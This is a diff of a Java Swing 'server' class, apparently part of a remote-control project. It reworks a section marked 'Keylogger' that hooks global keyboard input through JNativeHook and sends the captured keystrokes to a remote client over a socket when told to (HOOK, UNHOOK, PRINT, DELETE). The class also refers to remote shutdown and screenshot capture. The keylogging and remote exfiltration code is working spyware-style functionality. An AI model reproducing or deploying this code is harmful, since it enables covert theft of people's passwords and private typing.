@@ -62,7 +62,7 @@ public class server extends javax.swing.JFrame {
 
     
     @SuppressWarnings("unchecked")
-    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
+    // <editor-fold defaultstate="collapsed" desc="Generated Code">                          
     private void initComponents() {
 
         Server = new javax.swing.JButton();
@@ -95,7 +95,7 @@ public class server extends javax.swing.JFrame {
         );
 
         pack();
-    }// </editor-fold>//GEN-END:initComponents
+    }// </editor-fold>                        
     public void receiveSignal()
     {
         try{
@@ -106,7 +106,7 @@ public class server extends javax.swing.JFrame {
         }
     }
     
-    private void ServerActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ServerActionPerformed
+    private void ServerActionPerformed(java.awt.event.ActionEvent evt) {                                       
        ServerSocket listener = null;
        System.out.println("Server is waiting to accept user...");
        try {
@@ -137,7 +137,7 @@ public class server extends javax.swing.JFrame {
        } catch (IOException e) {
            JOptionPane.showMessageDialog(rootPane, "Không thể mở server");
        } 
-    }//GEN-LAST:event_ServerActionPerformed
+    }                                      
 
     /**
      * @param args the command line arguments
@@ -173,29 +173,34 @@ public class server extends javax.swing.JFrame {
 //        });
 //    }
     
-    int i = 0;
+    // Keylogger
+    
+    int counthookKey = 0;
     public void hookKey(KeyLogger k){
-        i += 1;
-        if(i == 1){
+        counthookKey += 1;
+        if(counthookKey == 1){
             try{
                 GlobalScreen.registerNativeHook();
-                System.out.println("hook 1");
             }catch (NativeHookException e){
                 e.printStackTrace();
             }
             GlobalScreen.addNativeKeyListener(k);
-
-            System.out.println("hook");
-        } else{
             
+        } else{
+            if(counthookKey > countunHook){
+                GlobalScreen.removeNativeKeyListener(k);
+            }
+            
+            GlobalScreen.addNativeKeyListener(k);
+                          
         }
-        
     }
-
+    
+    int countunHook = 1;
     public void unHookKey(KeyLogger k) throws NativeHookException{
-        k = null;
-//        GlobalScreen.unregisterNativeHook();
-        System.out.println("unhook");
+        countunHook += 1;
+        GlobalScreen.removeNativeKeyListener(k);
+        k.store = "";
     }
 
     public void print(KeyLogger k) {
@@ -204,37 +209,20 @@ public class server extends javax.swing.JFrame {
 
         try {
             if(k == null){
-                System.out.println("null object");
-                mes = "null object";
-                program.os.write("n1");
-                program.os.newLine();
-                program.os.flush();
-                
-                program.os.write("n2");
+                program.os.write("");
                 program.os.newLine();
                 program.os.flush();
             }
             else{
-                System.out.println("not null");
                 mes = k.store;
-                if(mes != ""){
-                    System.out.println(mes);
-                    program.os.write("oke");
-                    program.os.newLine();
-                    program.os.flush();
-                    
+                if(mes != ""){                  
                     program.os.write(mes);
                     program.os.newLine();
                     program.os.flush();
                     k.store = "";
                 }
-                else {
-                    program.os.write("ko");
-                    program.os.newLine();
-                    System.out.println("null22");
-                    program.os.flush();
-                    
-                    program.os.write("null22");
+                else {            
+                    program.os.write("");
                     program.os.newLine();
                     program.os.flush();
                 }
@@ -243,35 +231,35 @@ public class server extends javax.swing.JFrame {
             e.printStackTrace();
         }
 
-        System.out.println("print");
     }
 
-    public void keylog() throws IOException{
-                    
+    public void keylog() throws IOException{     
         KeyLogger k = new KeyLogger();
-//        System.out.println("hook");
         while(true){
             receiveSignal();
             switch (program.signal){
                 case "HOOK" ->{
                     hookKey(k);
-                    System.out.println("hook");
                     break;
                     
                 }
                 case "UNHOOK"->{
-                try {
-                    // k = null;
-                    unHookKey(k);
-                } catch (NativeHookException ex) {
-                    Logger.getLogger(server.class.getName()).log(Level.SEVERE, null, ex);
+                    try {
+                        unHookKey(k);
+                        break;
+                    } catch (NativeHookException ex) {
+                        Logger.getLogger(server.class.getName()).log(Level.SEVERE, null, ex);
+                    }
+                      break;
                 }
-                System.out.println("unhook");
-                break;
-                }
+
                 case "PRINT"->{
                     print(k);
-                    System.out.println("print");
+                    k.store = "";
+                    break;
+                }
+                case "DELETE"->{
+                    k.store = "";
                     break;
                 }
                 case "QUIT"->{
@@ -280,6 +268,8 @@ public class server extends javax.swing.JFrame {
             }
         }
     }
+    
+    // End Keylogger
     
     public void shutdown()
     {
@@ -482,9 +472,9 @@ public void takepic()
     private Image newimg;
     private Robot robot;
     private static BufferedImage bimg;
-    // Variables declaration - do not modify//GEN-BEGIN:variables
+    // Variables declaration - do not modify                     
     private javax.swing.JButton Server;
-    // End of variables declaration//GEN-END:variables
+    // End of variables declaration                   
 //    private ByteArrayOutputStream ous = new ByteArrayOutputStream();
     void setvisible(boolean b) {
         throw new UnsupportedOperationException("Not supported yet."); // Generated from nbfs://nbhost/SystemFileSystem/Templates/Classes/Code/GeneratedMethodBody
@@ -493,7 +483,4 @@ public void takepic()
     private String Str(int read) {
         throw new UnsupportedOperationException("Not supported yet."); // Generated from nbfs://nbhost/SystemFileSystem/Templates/Classes/Code/GeneratedMethodBody
     }
-    
-    
-    
 }
